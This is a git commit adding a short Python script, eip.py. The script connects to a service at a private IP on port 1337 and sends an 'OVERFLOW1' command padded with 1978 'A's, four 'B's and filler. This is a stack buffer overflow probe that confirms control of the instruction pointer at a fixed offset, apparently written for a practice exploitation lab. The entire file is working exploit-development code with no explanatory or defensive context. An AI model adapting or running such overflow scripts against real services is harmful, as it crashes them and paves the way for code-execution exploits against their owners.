6c793f9b0686f62361d39d7364ebce158249ca52
z3r0day <73271976+SxNade@users.noreply.github.com>
2021-07-06 11:58:33 +0000

    Add files via upload

---
+++ 1/eip.py
@@ -0,0 +1,26 @@
+import socket
+import sys
+import time
+
+
+print("[+] Nani! offset\n")
+
+buff = "A" * 1978
+eip = "B" * 4
+fill = "C" * 118
+
+payload = buff + eip + fill
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to the Application
+s.connect(('10.10.73.133', 1337))
+s.recv(1024)	#Recv the banner
+
+
+#Finally the vulnerable command PASS
+s.send('OVERFLOW1 ' + payload + '\r\n')
+s.send('EXIT\r\n')
+s.close()
+
+print("\nExecution Finished!\n")
